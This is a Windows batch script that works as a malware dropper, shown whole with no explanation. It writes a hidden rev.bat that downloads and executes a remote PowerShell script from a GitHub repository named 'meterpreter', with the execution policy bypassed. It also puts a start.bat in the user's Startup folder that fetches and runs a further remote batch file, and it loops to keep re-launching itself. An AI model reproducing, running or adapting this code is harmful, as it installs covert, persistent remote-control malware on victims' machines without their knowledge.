@echo off
cd %temp%
:loop
    echo @echo off > rev.bat
    echo :loop >> rev.bat
    echo     if not exist "%temp%\sh.ps1" ^( >> rev.bat
    echo           echo IEX ^^(New-Object System.Net.WebClient^^).DownloadString^^('https://raw.githubusercontent.com/0x2034/meterpreter/main/meter.ps1'^^) ^>^> "%temp%\sh.ps1" >> rev.bat
    echo     ^) >> rev.bat
    echo     powershell -ep bypass -WindowStyle Hidden -File "%temp%\sh.ps1" >> rev.bat
    echo     :check_start_bat >> rev.bat
    echo     if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat" ^( >> rev.bat
    echo           echo @echo off ^> "%temp%\start.bat" >> rev.bat
    echo           echo curl https://raw.githubusercontent.com/0x2034/meterpreter/main/nihbtdtdow.bat -o "%temp%\nihbtdtdow.bat" ^>^> "%temp%\start.bat" >> rev.bat
    echo           echo powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\nihbtdtdow.bat\" -WindowStyle Hidden" ^>^> "%temp%\start.bat" >> rev.bat
    echo           echo powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden" ^>^> "%temp%\start.bat" >> rev.bat
    echo           move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >> rev.bat      
    echo     ^) >> rev.bat
    echo     timeout /t 7 /nobreak ^>nul >> rev.bat
    echo     goto check_start_bat >> rev.bat
    echo timeout /t 300 /nobreak ^>nul >> rev.bat
    echo goto loop >> rev.bat
powershell -c "Start-Process -FilePath \"%temp%\rev.bat\" -WindowStyle Hidden"
timeout /t 1200 /nobreak >nul
goto loop
